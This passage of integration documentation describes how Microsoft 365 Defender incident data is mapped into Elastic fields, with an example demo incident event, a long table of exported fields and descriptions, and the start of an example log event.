                        "verdict": "unknown"
                    }
                ],
                "first_activity_datetime": "2021-04-26T07:45:50.116Z",
                "id": "da637551227677560813_-961444813",
                "incident_id": "28282",
                "incident_web_url": {
                    "domain": "security.microsoft.com",
                    "original": "https://security.microsoft.com/incidents/28282?tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
                    "path": "/incidents/28282",
                    "query": "tid=b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
                    "scheme": "https"
                },
                "last_activity_datetime": "2021-05-02T07:56:58.222Z",
                "last_update_datetime": "2021-05-02T14:19:01.326Z",
                "mitre_techniques": [
                    "T1564.001"
                ],
                "provider_alert_id": "da637551227677560813_-961444813",
                "recommended_actions": "Collect artifacts and determine scope\n�\tReview the machine timeline for suspicious activities that may have occurred before and after the time of the alert, and record additional related artifacts (files, IPs/URLs) \n�\tLook for the presence of relevant artifacts on other systems. Identify commonalities and differences between potentially compromised systems.\n�\tSubmit relevant files for deep analysis and review resulting detailed behavioral information.\n�\tSubmit undetected files to the MMPC malware portal\n\nInitiate containment & mitigation \n�\tContact the user to verify intent and initiate local remediation actions as needed.\n�\tUpdate AV signatures and run a full scan. The scan might reveal and remove previously-undetected malware components.\n�\tEnsure that the machine has the latest security updates. In particular, ensure that you have installed the latest software, web browser, and Operating System versions.\n�\tIf credential theft is suspected, reset all relevant users passwords.\n�\tBlock communication with relevant URLs or IPs at the organization�s perimeter.",
                "service_source": "microsoftDefenderForEndpoint",
                "severity": "low",
                "status": "new",
                "tenant_id": "b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
                "title": "Suspicious execution of hidden file"
            },
            "assigned_to": "KaiC@contoso.onmicrosoft.com",
            "classification": "truePositive",
            "comments": [
                {
                    "comment": "Demo incident",
                    "createdBy": "DavidS@contoso.onmicrosoft.com",
                    "createdTime": "2021-09-30T12:07:37.2756993Z"
                }
            ],
            "created_datetime": "2021-08-13T08:43:35.553Z",
            "determination": "multiStagedAttack",
            "display_name": "Multi-stage incident involving Initial access & Command and control on multiple endpoints reported by multiple sources",
            "id": "2972395",
            "last_update_datetime": "2021-09-30T09:35:45.113Z",
            "odata_type": "#microsoft.graph.security.incident",
            "severity": "medium",
            "status": "active",
            "tags": [
                "Demo"
            ],
            "tenant_id": "b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
            "web_url": {
                "domain": "security.microsoft.com",
                "original": "https://security.microsoft.com/incidents/2972395?tid=12f988bf-16f1-11af-11ab-1d7cd011db47",
                "path": "/incidents/2972395",
                "query": "tid=12f988bf-16f1-11af-11ab-1d7cd011db47",
                "scheme": "https"
            }
        }
    },
    "message": "Multi-stage incident involving Initial access & Command and control on multiple endpoints reported by multiple sources",
    "process": {
        "command_line": [
            "\"MsSense.exe\""
        ],
        "hash": {
            "sha1": [
                "5f1e8acedc065031aad553b710838eb366cfee9a"
            ],
            "sha256": [
                "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec"
            ]
        },
        "parent": {
            "pid": [
                668
            ],
            "start": [
                "2021-08-12T07:39:09.090Z"
            ]
        },
        "pid": [
            4780
        ],
        "start": [
            "2021-08-12T12:43:19.077Z"
        ],
        "user": {
            "name": [
                "SYSTEM"
            ]
        }
    },
    "registry": {
        "hive": [
            "HKEY_LOCAL_MACHINE"
        ],
        "key": [
            "SYSTEM\\CONTROLSET001\\CONTROL\\WMI\\AUTOLOGGER\\SENSEAUDITLOGGER"
        ]
    },
    "related": {
        "hash": [
            "5f1e8acedc065031aad553b710838eb366cfee9a",
            "8963a19fb992ad9a76576c5638fd68292cffb9aaac29eb8285f9abf6196a7dec"
        ],
        "hosts": [
            "tempDns",
            "NT AUTHORITY"
        ],
        "user": [
            "KaiC@contoso.onmicrosoft.com",
            "DavidS@contoso.onmicrosoft.com",
            "SYSTEM",
            "S-1-5-18"
        ]
    },
    "source": {
        "user": {
            "name": "KaiC@contoso.onmicrosoft.com"
        }
    },
    "tags": [
        "preserve_original_event",
        "preserve_duplicate_custom_fields",
        "forwarded",
        "m365_defender-incident"
    ],
    "threat": {
        "tactic": {
            "name": [
                "DefenseEvasion"
            ]
        },
        "technique": {
            "subtechnique": {
                "id": [
                    "T1564.001"
                ]
            }
        }
    }
}
```

**Exported fields**

| Field | Description | Type |
|---|---|---|
| @timestamp | Event timestamp. | date |
| cloud.account.id | The cloud account or organization id used to identify different entities in a multi-tenant environment. Examples: AWS account id, Google Cloud ORG Id, or other unique identifier. | keyword |
| cloud.availability_zone | Availability zone in which this host is running. | keyword |
| cloud.image.id | Image ID for the cloud instance. | keyword |
| cloud.instance.id | Instance ID of the host machine. | keyword |
| cloud.instance.name | Instance name of the host machine. | keyword |
| cloud.machine.type | Machine type of the host machine. | keyword |
| cloud.project.id | Name of the project in Google Cloud. | keyword |
| cloud.provider | Name of the cloud provider. Example values are aws, azure, gcp, or digitalocean. | keyword |
| cloud.region | Region in which this host is running. | keyword |
| container.id | Unique container id. | keyword |
| container.image.name | Name of the image the container was built on. | keyword |
| container.labels | Image labels. | object |
| container.name | Container name. | keyword |
| data_stream.dataset | Data stream dataset. | constant_keyword |
| data_stream.namespace | Data stream namespace. | constant_keyword |
| data_stream.type | Data stream type. | constant_keyword |
| ecs.version | ECS version this event conforms to. `ecs.version` is a required field and must exist in all events. When querying across multiple indices -- which may conform to slightly different ECS versions -- this field lets integrations adjust to the schema version of the events. | keyword |
| email.delivery_timestamp | The date and time when the email message was received by the service or client. | date |
| email.direction | The direction of the message based on the sending and receiving domains. | keyword |
| email.from.address | The email address of the sender, typically from the RFC 5322 `From:` header field. | keyword |
| email.subject | A brief summary of the topic of the message. | keyword |
| email.subject.text | Multi-field of `email.subject`. | match_only_text |
| email.to.address | The email address of recipient | keyword |
| event.action | The action captured by the event. This describes the information in the event. It is more specific than `event.category`. Examples are `group-add`, `process-started`, `file-created`. The value is normally defined by the implementer. | keyword |
| event.category | This is one of four ECS Categorization Fields, and indicates the second level in the ECS category hierarchy. `event.category` represents the "big buckets" of ECS categories. For example, filtering on `event.category:process` yields all events relating to process activity. This field is closely related to `event.type`, which is used as a subcategory. This field is an array. This will allow proper categorization of some events that fall in multiple categories. | keyword |
| event.created | `event.created` contains the date/time when the event was first read by an agent, or by your pipeline. This field is distinct from `@timestamp` in that `@timestamp` typically contain the time extracted from the original event. In most situations, these two timestamps will be slightly different. The difference can be used to calculate the delay between your source generating an event, and the time when your agent first processed it. This can be used to monitor your agent's or pipeline's ability to keep up with your event source. In case the two timestamps are identical, `@timestamp` should be used. | date |
| event.dataset | Event dataset. | constant_keyword |
| event.id | Unique ID to describe the event. | keyword |
| event.kind | This is one of four ECS Categorization Fields, and indicates the highest level in the ECS category hierarchy. `event.kind` gives high-level information about what type of information the event contains, without being specific to the contents of the event. For example, values of this field distinguish alert events from metric events. The value of this field can be used to inform how these kinds of events should be handled. They may warrant different retention, different access control, it may also help understand whether the data is coming in at a regular interval or not. | keyword |
| event.module | Event module. | constant_keyword |
| event.original | Raw text message of entire event. Used to demonstrate log integrity or where the full log message (before splitting it up in multiple parts) may be required, e.g. for reindex. This field is not indexed and doc_values are disabled. It cannot be searched, but it can be retrieved from `_source`. If users wish to override this and index this field, please see `Field data types` in the `Elasticsearch Reference`. | keyword |
| event.provider | Source of the event. Event transports such as Syslog or the Windows Event Log typically mention the source of an event. It can be the name of the software that generated the event (e.g. Sysmon, httpd), or of a subsystem of the operating system (kernel, Microsoft-Windows-Security-Auditing). | keyword |
| event.severity | The numeric severity of the event according to your event source. What the different severity values mean can be different between sources and use cases. It's up to the implementer to make sure severities are consistent across events from the same source. The Syslog severity belongs in `log.syslog.severity.code`. `event.severity` is meant to represent the severity according to the event source (e.g. firewall, IDS). If the event source does not publish its own severity, you may optionally copy the `log.syslog.severity.code` to `event.severity`. | long |
| event.type | This is one of four ECS Categorization Fields, and indicates the third level in the ECS category hierarchy. `event.type` represents a categorization "sub-bucket" that, when used along with the `event.category` field values, enables filtering events down to a level appropriate for single visualization. This field is an array. This will allow proper categorization of some events that fall in multiple event types. | keyword |
| event.url | URL linking to an external system to continue investigation of this event. This URL links to another system where in-depth investigation of the specific occurrence of this event can take place. Alert events, indicated by `event.kind:alert`, are a common use case for this field. | keyword |
| file.hash.sha1 | SHA1 hash. | keyword |
| file.hash.sha256 | SHA256 hash. | keyword |
| file.name | Name of the file including the extension, without the directory. | keyword |
| file.path | Full path to the file, including the file name. It should include the drive letter, when appropriate. | keyword |
| file.path.text | Multi-field of `file.path`. | match_only_text |
| file.size | File size in bytes. Only relevant when `file.type` is "file". | long |
| group.id | Unique identifier for the group on the system/platform. | keyword |
| group.name | Name of the group. | keyword |
| host.architecture | Operating system architecture. | keyword |
| host.containerized | If the host is a container. | boolean |
| host.domain | Name of the domain of which the host is a member. For example, on Windows this could be the host's Active Directory domain or NetBIOS domain name. For Linux this could be the domain of the host's LDAP provider. | keyword |
| host.hostname | Hostname of the host. It normally contains what the `hostname` command returns on the host machine. | keyword |
| host.id | Unique host id. As hostname is not always unique, use values that are meaningful in your environment. Example: The current usage of `beat.name`. | keyword |
| host.ip | Host ip addresses. | ip |
| host.mac | Host mac addresses. | keyword |
| host.name | Name of the host. It can contain what `hostname` returns on Unix systems, the fully qualified domain name, or a name specified by the user. The sender decides which value to use. | keyword |
| host.os.build | OS build information. | keyword |
| host.os.codename | OS codename, if any. | keyword |
| host.os.family | OS family (such as redhat, debian, freebsd, windows). | keyword |
| host.os.kernel | Operating system kernel version as a raw string. | keyword |
| host.os.name | Operating system name, without the version. | keyword |
| host.os.name.text | Multi-field of `host.os.name`. | text |
| host.os.platform | Operating system platform (such centos, ubuntu, windows). | keyword |
| host.os.version | Operating system version as a raw string. | keyword |
| host.type | Type of host. For Cloud providers this can be the machine type like `t2.medium`. If vm, this could be the container, for example, or other information meaningful in your environment. | keyword |
| input.type | Input type | keyword |
| log.offset | Log offset | long |
| m365_defender.incident.alert.actor_display_name | The adversary or activity group that is associated with this alert. | keyword |
| m365_defender.incident.alert.alert_web_url.domain |  | keyword |
| m365_defender.incident.alert.alert_web_url.extension |  | keyword |
| m365_defender.incident.alert.alert_web_url.fragment |  | keyword |
| m365_defender.incident.alert.alert_web_url.full |  | keyword |
| m365_defender.incident.alert.alert_web_url.original |  | keyword |
| m365_defender.incident.alert.alert_web_url.password |  | keyword |
| m365_defender.incident.alert.alert_web_url.path |  | keyword |
| m365_defender.incident.alert.alert_web_url.port |  | long |
| m365_defender.incident.alert.alert_web_url.query |  | keyword |
| m365_defender.incident.alert.alert_web_url.scheme |  | keyword |
| m365_defender.incident.alert.alert_web_url.username |  | keyword |
| m365_defender.incident.alert.assigned_to | Owner of the alert, or null if no owner is assigned. | keyword |
| m365_defender.incident.alert.category | The attack kill-chain category that the alert belongs to. Aligned with the MITRE ATT&CK framework. | keyword |
| m365_defender.incident.alert.classification | Specifies whether the alert represents a true threat. Possible values are: unknown, falsePositive, truePositive, benignPositive, unknownFutureValue. | keyword |
| m365_defender.incident.alert.comments | Array of comments created by the Security Operations (SecOps) team during the alert management process. | flattened |
| m365_defender.incident.alert.created_datetime | Time when Microsoft 365 Defender created the alert. | date |
| m365_defender.incident.alert.description | String value describing each alert. | keyword |
| m365_defender.incident.alert.detection_source | Detection technology or sensor that identified the notable component or activity. | keyword |
| m365_defender.incident.alert.detector_id | The ID of the detector that triggered the alert. | keyword |
| m365_defender.incident.alert.determination | Specifies the result of the investigation, whether the alert represents a true attack and if so, the nature of the attack. Possible values are: unknown, apt, malware, securityPersonnel, securityTesting, unwantedSoftware, other, multiStagedAttack, compromisedUser, phishing, maliciousUserActivity, clean, insufficientData, confirmedUserActivity, lineOfBusinessApplication, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.antispam_direction | Direction of the email relative to your network. The possible values are: Inbound, Outbound or Intraorg. | keyword |
| m365_defender.incident.alert.evidence.app_id | Unique identifier of the application. | keyword |
| m365_defender.incident.alert.evidence.attachments_count | Number of attachments in the email. | long |
| m365_defender.incident.alert.evidence.azure_ad_device_id | A unique identifier assigned to a device by Azure Active Directory (Azure AD) when device is Azure AD-joined. | keyword |
| m365_defender.incident.alert.evidence.cluster_by | The clustering logic of the emails inside the cluster. | keyword |
| m365_defender.incident.alert.evidence.cluster_by_value | The value utilized to cluster the similar emails. | keyword |
| m365_defender.incident.alert.evidence.created_datetime | The time the evidence was created and added to the alert. | date |
| m365_defender.incident.alert.evidence.defender_av_status | State of the Defender AntiMalware engine. The possible values are: notReporting, disabled, notUpdated, updated, unknown, notSupported, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.delivery_action | Delivery action of the email. The possible values are: Delivered, DeliveredAsSpam, Junked, Blocked, or Replaced. | keyword |
| m365_defender.incident.alert.evidence.delivery_location | Location where the email was delivered. The possible values are: Inbox, External, JunkFolder, Quarantine, Failed, Dropped, DeletedFolder or Forwarded. | keyword |
| m365_defender.incident.alert.evidence.detection_status | The status of the detection.The possible values are: detected, blocked, prevented, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.device_dns_name | The fully qualified domain name (FQDN) for the device. | keyword |
| m365_defender.incident.alert.evidence.display_name | Name of the application. | keyword |
| m365_defender.incident.alert.evidence.email_count | Count of emails in the email cluster. | long |
| m365_defender.incident.alert.evidence.file_details.issuer | The certificate authority (CA) that issued the certificate. | keyword |
| m365_defender.incident.alert.evidence.file_details.name | The name of the file. | keyword |
| m365_defender.incident.alert.evidence.file_details.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.file_details.path | The file path (location) of the file instance. | keyword |
| m365_defender.incident.alert.evidence.file_details.publisher | The publisher of the file. | keyword |
| m365_defender.incident.alert.evidence.file_details.sha1 | The Sha1 cryptographic hash of the file content. | keyword |
| m365_defender.incident.alert.evidence.file_details.sha256 | The Sha256 cryptographic hash of the file content. | keyword |
| m365_defender.incident.alert.evidence.file_details.signer | The signer of the signed file. | keyword |
| m365_defender.incident.alert.evidence.file_details.size | The size of the file in bytes. | long |
| m365_defender.incident.alert.evidence.first_seen_datetime | The date and time when the device was first seen. | date |
| m365_defender.incident.alert.evidence.health_status | The health state of the device.The possible values are: active, inactive, impairedCommunication, noSensorData, noSensorDataImpairedCommunication, unknown, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.image_file.issuer | The certificate authority (CA) that issued the certificate. | keyword |
| m365_defender.incident.alert.evidence.image_file.name | The name of the file. | keyword |
| m365_defender.incident.alert.evidence.image_file.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.image_file.path | The file path (location) of the file instance. | keyword |
| m365_defender.incident.alert.evidence.image_file.publisher | The publisher of the file. | keyword |
| m365_defender.incident.alert.evidence.image_file.sha1 | The Sha1 cryptographic hash of the file content. | keyword |
| m365_defender.incident.alert.evidence.image_file.sha256 | The Sha256 cryptographic hash of the file content. | keyword |
| m365_defender.incident.alert.evidence.image_file.signer | The signer of the signed file. | keyword |
| m365_defender.incident.alert.evidence.image_file.size | The size of the file in bytes. | long |
| m365_defender.incident.alert.evidence.instance_id | Identifier of the instance of the Software as a Service (SaaS) application. | keyword |
| m365_defender.incident.alert.evidence.instance_name | Name of the instance of the SaaS application. | keyword |
| m365_defender.incident.alert.evidence.internet_message_id | Public-facing identifier for the email that is set by the sending email system. | keyword |
| m365_defender.incident.alert.evidence.ip_address | The value of the IP Address, can be either in V4 address or V6 address format. | ip |
| m365_defender.incident.alert.evidence.language | Detected language of the email content. | keyword |
| m365_defender.incident.alert.evidence.logged_on_users.account_name | User account name of the logged-on user. | keyword |
| m365_defender.incident.alert.evidence.logged_on_users.domain_name | User account domain of the logged-on user. | keyword |
| m365_defender.incident.alert.evidence.logged_on_users.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.mde_device_id | A unique identifier assigned to a device by Microsoft Defender for Endpoint. | keyword |
| m365_defender.incident.alert.evidence.network_message_id | Unique identifier for the email, generated by Microsoft 365. | keyword |
| m365_defender.incident.alert.evidence.network_message_ids | Unique identifiers for the emails in the cluster, generated by Microsoft 365. | keyword |
| m365_defender.incident.alert.evidence.object_id | The unique identifier of the application object in Azure AD. | keyword |
| m365_defender.incident.alert.evidence.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.onboarding_status | The status of the machine onboarding to Microsoft Defender for Endpoint.The possible values are: insufficientInfo, onboarded, canBeOnboarded, unsupported, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.os_build | The build version for the operating system the device is running. | keyword |
| m365_defender.incident.alert.evidence.os_platform | The operating system platform the device is running. | keyword |
| m365_defender.incident.alert.evidence.p1_sender.display_name | The name of the sender. | keyword |
| m365_defender.incident.alert.evidence.p1_sender.domain_name | Sender domain. | keyword |
| m365_defender.incident.alert.evidence.p1_sender.email_address | Sender email address. | keyword |
| m365_defender.incident.alert.evidence.p1_sender.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.p2_sender.display_name | The name of the sender. | keyword |
| m365_defender.incident.alert.evidence.p2_sender.domain_name | Sender domain. | keyword |
| m365_defender.incident.alert.evidence.p2_sender.email_address | Sender email address. | keyword |
| m365_defender.incident.alert.evidence.p2_sender.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.parent_process.creation_datetime | Date and time when the parent of the process was created. | date |
| m365_defender.incident.alert.evidence.parent_process.id | Process ID (PID) of the parent process that spawned the process. | long |
| m365_defender.incident.alert.evidence.parent_process.image_file.issuer | The certificate authority (CA) that issued the certificate. | keyword |
| m365_defender.incident.alert.evidence.parent_process.image_file.name | The name of the file. | keyword |
| m365_defender.incident.alert.evidence.parent_process.image_file.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.parent_process.image_file.path | The file path (location) of the file instance. | keyword |
| m365_defender.incident.alert.evidence.parent_process.image_file.publisher | The publisher of the file. | keyword |
| m365_defender.incident.alert.evidence.parent_process.image_file.sha1 | The Sha1 cryptographic hash of the file content. | keyword |
| m365_defender.incident.alert.evidence.parent_process.image_file.sha256 | The Sha256 cryptographic hash of the file content. | keyword |
| m365_defender.incident.alert.evidence.parent_process.image_file.signer | The signer of the signed file. | keyword |
| m365_defender.incident.alert.evidence.parent_process.image_file.size | The size of the file in bytes. | long |
| m365_defender.incident.alert.evidence.primary_address | The primary email address of the mailbox. | keyword |
| m365_defender.incident.alert.evidence.process.command_line | Command line used to create the new process. | keyword |
| m365_defender.incident.alert.evidence.process.creation_datetime | Date and time the process was created. | date |
| m365_defender.incident.alert.evidence.process.id | Process ID (PID) of the newly created process. | long |
| m365_defender.incident.alert.evidence.publisher | The name of the application publisher. | keyword |
| m365_defender.incident.alert.evidence.query | The query used to identify the email cluster. | keyword |
| m365_defender.incident.alert.evidence.rbac_group.id | The ID of the role-based access control (RBAC) device group. | keyword |
| m365_defender.incident.alert.evidence.rbac_group.name | The name of the RBAC device group. | keyword |
| m365_defender.incident.alert.evidence.received_datetime | Date and time when the email was received. | date |
| m365_defender.incident.alert.evidence.recipient_email_address | Email address of the recipient, or email address of the recipient after distribution list expansion. | keyword |
| m365_defender.incident.alert.evidence.registry_hive | Registry hive of the key that the recorded action was applied to. | keyword |
| m365_defender.incident.alert.evidence.registry_key | Registry key that the recorded action was applied to. | keyword |
| m365_defender.incident.alert.evidence.registry_value | Data of the registry value that the recorded action was applied to. | keyword |
| m365_defender.incident.alert.evidence.registry_value_name | Name of the registry value that the recorded action was applied to. | keyword |
| m365_defender.incident.alert.evidence.registry_value_type | Data type, such as binary or string, of the registry value that the recorded action was applied to. | keyword |
| m365_defender.incident.alert.evidence.remediation_status | Status of the remediation action taken. The possible values are: none, remediated, prevented, blocked, notFound, active, pendingApproval, declined, notRemediated, running, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.remediation_status_details | Details about the remediation status. | keyword |
| m365_defender.incident.alert.evidence.risk_score | Risk score as evaluated by Microsoft Defender for Endpoint. The possible values are: none, informational, low, medium, high, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.roles | The role/s that an evidence entity represents in an alert, e.g., an IP address that is associated with an attacker will have the evidence role "Attacker". | keyword |
| m365_defender.incident.alert.evidence.saas_app_id | The identifier of the SaaS application. | keyword |
| m365_defender.incident.alert.evidence.security_group_id | Unique identifier of the security group. | keyword |
| m365_defender.incident.alert.evidence.sender_ip | IP address of the last detected mail server that relayed the message. | ip |
| m365_defender.incident.alert.evidence.subject | Subject of the email. | keyword |
| m365_defender.incident.alert.evidence.tags | Array of custom tags associated with an evidence instance, for example to denote a group of devices, high value assets, etc. | keyword |
| m365_defender.incident.alert.evidence.threat_detection_methods | Collection of methods used to detect malware, phishing, or other threats found in the email. | keyword |
| m365_defender.incident.alert.evidence.threats | Collection of detection names for malware or other threats found. | keyword |
| m365_defender.incident.alert.evidence.type |  | keyword |
| m365_defender.incident.alert.evidence.url | The Unique Resource Locator (URL). | keyword |
| m365_defender.incident.alert.evidence.url_count | Number of embedded URLs in the email. | long |
| m365_defender.incident.alert.evidence.urls | Collection of the URLs contained in this email. | keyword |
| m365_defender.incident.alert.evidence.urn | Uniform resource name (URN) of the automated investigation where the cluster was identified. | keyword |
| m365_defender.incident.alert.evidence.user_account.account_name | The user account's displayed name. | keyword |
| m365_defender.incident.alert.evidence.user_account.azure_ad_user_id | The user object identifier in Azure AD. | keyword |
| m365_defender.incident.alert.evidence.user_account.display_name | The user display name in Azure AD. | keyword |
| m365_defender.incident.alert.evidence.user_account.domain_name | The name of the Active Directory domain of which the user is a member. | keyword |
| m365_defender.incident.alert.evidence.user_account.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.user_account.user_principal_name | The user principal name of the account in Azure AD. | keyword |
| m365_defender.incident.alert.evidence.user_account.user_sid | The local security identifier of the user account. | keyword |
| m365_defender.incident.alert.evidence.verdict | The decision reached by automated investigation. The possible values are: unknown, suspicious, malicious, noThreatsFound, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.version | The version of the operating system platform. | keyword |
| m365_defender.incident.alert.evidence.vm_metadata.cloud_provider | The cloud provider hosting the virtual machine. The possible values are: unknown, azure, unknownFutureValue. | keyword |
| m365_defender.incident.alert.evidence.vm_metadata.odata_type |  | keyword |
| m365_defender.incident.alert.evidence.vm_metadata.resource_id | Unique identifier of the Azure resource. | keyword |
| m365_defender.incident.alert.evidence.vm_metadata.subscription_id | Unique identifier of the Azure subscription the customer tenant belongs to. | keyword |
| m365_defender.incident.alert.evidence.vm_metadata.vm_id | Unique identifier of the virtual machine instance. | keyword |
| m365_defender.incident.alert.first_activity_datetime | The earliest activity associated with the alert. | date |
| m365_defender.incident.alert.id | Unique identifier to represent the alert resource. | keyword |
| m365_defender.incident.alert.incident_id | Unique identifier to represent the incident this alert resource is associated with. | keyword |
| m365_defender.incident.alert.incident_web_url.domain |  | keyword |
| m365_defender.incident.alert.incident_web_url.extension |  | keyword |
| m365_defender.incident.alert.incident_web_url.fragment |  | keyword |
| m365_defender.incident.alert.incident_web_url.full |  | keyword |
| m365_defender.incident.alert.incident_web_url.original |  | keyword |
| m365_defender.incident.alert.incident_web_url.password |  | keyword |
| m365_defender.incident.alert.incident_web_url.path |  | keyword |
| m365_defender.incident.alert.incident_web_url.port |  | long |
| m365_defender.incident.alert.incident_web_url.query |  | keyword |
| m365_defender.incident.alert.incident_web_url.scheme |  | keyword |
| m365_defender.incident.alert.incident_web_url.username |  | keyword |
| m365_defender.incident.alert.last_activity_datetime | The oldest activity associated with the alert. | date |
| m365_defender.incident.alert.last_update_datetime | Time when the alert was last updated at Microsoft 365 Defender. | date |
| m365_defender.incident.alert.mitre_techniques | The attack techniques, as aligned with the MITRE ATT&CK framework. | keyword |
| m365_defender.incident.alert.provider_alert_id | The ID of the alert as it appears in the security provider product that generated the alert. | keyword |
| m365_defender.incident.alert.recommended_actions | Recommended response and remediation actions to take in the event this alert was generated. | match_only_text |
| m365_defender.incident.alert.resolved_datetime | Time when the alert was resolved. | date |
| m365_defender.incident.alert.service_source | The service or product that created this alert. Possible values are: microsoftDefenderForEndpoint, microsoftDefenderForIdentity, microsoftCloudAppSecurity, microsoftDefenderForOffice365, microsoft365Defender, aadIdentityProtection, appGovernance, dataLossPrevention. | keyword |
| m365_defender.incident.alert.severity | Indicates the possible impact on assets. The higher the severity the bigger the impact. Typically higher severity items require the most immediate attention. Possible values are: unknown, informational, low, medium, high, unknownFutureValue. | keyword |
| m365_defender.incident.alert.status | The status of the alert. Possible values are: new, inProgress, resolved, unknownFutureValue. | keyword |
| m365_defender.incident.alert.tenant_id | The Azure Active Directory tenant the alert was created in. | keyword |
| m365_defender.incident.alert.threat_display_name | The threat associated with this alert. | keyword |
| m365_defender.incident.alert.threat_family_name | Threat family associated with this alert. | keyword |
| m365_defender.incident.alert.title | Brief identifying string value describing the alert. | keyword |
| m365_defender.incident.assigned_to | Owner of the incident, or null if no owner is assigned. Free editable text. | keyword |
| m365_defender.incident.classification | The specification for the incident. Possible values are: unknown, falsePositive, truePositive, informationalExpectedActivity, unknownFutureValue. | keyword |
| m365_defender.incident.comments | Array of comments created by the Security Operations (SecOps) team when the incident is managed. | flattened |
| m365_defender.incident.created_datetime | Time when the incident was first created. | date |
| m365_defender.incident.determination | Specifies the determination of the incident. Possible values are: unknown, apt, malware, securityPersonnel, securityTesting, unwantedSoftware, other, multiStagedAttack, compromisedUser, phishing, maliciousUserActivity, clean, insufficientData, confirmedUserActivity, lineOfBusinessApplication, unknownFutureValue. | keyword |
| m365_defender.incident.display_name | The incident name. | keyword |
| m365_defender.incident.id | Unique identifier to represent the incident. | keyword |
| m365_defender.incident.last_update_datetime | Time when the incident was last updated. | date |
| m365_defender.incident.odata_type |  | keyword |
| m365_defender.incident.redirect_incident_id | Only populated in case an incident is grouped together with another incident, as part of the logic that processes incidents. In such a case, the status property is redirected. | keyword |
| m365_defender.incident.severity | Indicates the possible impact on assets. The higher the severity, the bigger the impact. Typically higher severity items require the most immediate attention. Possible values are: unknown, informational, low, medium, high, unknownFutureValue. | keyword |
| m365_defender.incident.status | The status of the incident. Possible values are: active, resolved, redirected, unknownFutureValue. | keyword |
| m365_defender.incident.tags | Array of custom tags associated with an incident. | keyword |
| m365_defender.incident.tenant_id | The Azure Active Directory tenant in which the alert was created. | keyword |
| m365_defender.incident.web_url.domain |  | keyword |
| m365_defender.incident.web_url.extension |  | keyword |
| m365_defender.incident.web_url.fragment |  | keyword |
| m365_defender.incident.web_url.full |  | keyword |
| m365_defender.incident.web_url.original |  | keyword |
| m365_defender.incident.web_url.password |  | keyword |
| m365_defender.incident.web_url.path |  | keyword |
| m365_defender.incident.web_url.port |  | long |
| m365_defender.incident.web_url.query |  | keyword |
| m365_defender.incident.web_url.scheme |  | keyword |
| m365_defender.incident.web_url.username |  | keyword |
| message | For log events the message field contains the log message, optimized for viewing in a log viewer. For structured logs without an original message field, other fields can be concatenated to form a human-readable summary of the event. If multiple messages exist, they can be combined into one message. | match_only_text |
| process.command_line | Full command line that started the process, including the absolute path to the executable, and all arguments. Some arguments may be filtered to protect sensitive information. | wildcard |
| process.command_line.text | Multi-field of `process.command_line`. | match_only_text |
| process.hash.sha1 | SHA1 hash. | keyword |
| process.hash.sha256 | SHA256 hash. | keyword |
| process.parent.hash.sha1 | SHA1 hash. | keyword |
| process.parent.hash.sha256 | SHA256 hash. | keyword |
| process.parent.pid | Process id. | long |
| process.parent.start | The time the process started. | date |
| process.pid | Process id. | long |
| process.start | The time the process started. | date |
| process.user.id | Unique identifier of the user. | keyword |
| process.user.name | Short name or login of the user. | keyword |
| process.user.name.text | Multi-field of `process.user.name`. | match_only_text |
| registry.data.type | Standard registry type for encoding contents | keyword |
| registry.hive | Abbreviated name for the hive. | keyword |
| registry.key | Hive-relative path of keys. | keyword |
| registry.value | Name of the value written. | keyword |
| related.hash | All the hashes seen on your event. Populating this field, then using it to search for hashes can help in situations where you're unsure what the hash algorithm is (and therefore which key name to search). | keyword |
| related.hosts | All hostnames or other host identifiers seen on your event. Example identifiers include FQDNs, domain names, workstation names, or aliases. | keyword |
| related.ip | All of the IPs seen on your event. | ip |
| related.user | All the user names or other user identifiers seen on the event. | keyword |
| source.ip | IP address of the source (IPv4 or IPv6). | ip |
| source.user.name | Short name or login of the user. | keyword |
| source.user.name.text | Multi-field of `source.user.name`. | match_only_text |
| tags | List of keywords used to tag each event. | keyword |
| threat.group.name | The name of the group for a set of related intrusion activity that are tracked by a common name in the security community. While not required, you can use a MITRE ATT&CK® group name. | keyword |
| threat.tactic.name | Name of the type of tactic used by this threat. You can use a MITRE ATT&CK® tactic, for example. (ex. https://attack.mitre.org/tactics/TA0002/) | keyword |
| threat.technique.subtechnique.id | The full id of subtechnique used by this threat. You can use a MITRE ATT&CK® subtechnique, for example. (ex. https://attack.mitre.org/techniques/T1059/001/) | keyword |
| user.domain | Name of the directory the user is a member of. For example, an LDAP or Active Directory domain name. | keyword |
| user.id | Unique identifier of the user. | keyword |
| user.name | Short name or login of the user. | keyword |
| user.name.text | Multi-field of `user.name`. | match_only_text |


### log

This is the `log` dataset.

#### Example

An example event for `log` looks as following:

```json
{
    "@timestamp": "2020-09-06T12:07:55.32Z",
    "agent": {
        "ephemeral_id": "75fd76e4-ea58-4f89-92b4-6d1acb0a10bb",
        "id": "5aad2f43-374a-4a11-a080-b8039c1ee9a1",
        "name": "docker-fleet-agent",
        "type": "filebeat",
        "version": "8.13.0"
    },
    "cloud": {
        "provider": "azure"
    },
    "data_stream": {
        "dataset": "m365_defender.log",
        "namespace": "ep",
        "type": "logs"
    },
    "ecs": {
        "version": "8.11.0"
    },
    "elastic_agent": {
        "id": "5aad2f43-374a-4a11-a080-b8039c1ee9a1",
        "snapshot": true,
        "version": "8.13.0"
    },
    "event": {
        "action": "InitialAccess",
        "agent_id_status": "verified",
        "category": [
            "host"
        ],
